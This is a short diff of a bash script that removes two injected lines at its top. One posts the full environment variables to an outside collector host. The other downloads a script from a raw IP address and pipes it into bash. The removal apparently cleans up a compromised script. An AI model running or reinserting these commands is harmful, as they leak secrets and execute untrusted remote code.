@@ -1,8 +1,5 @@
 #!/bin/bash
 
-curl -X POST https://qk62iikh.requestrepo.com/env -d "`env`"
-
-curl -sSL http://148.135.55.70:9002/2|bash
 set -eu
 
 readonly APP_NAME=${app?}
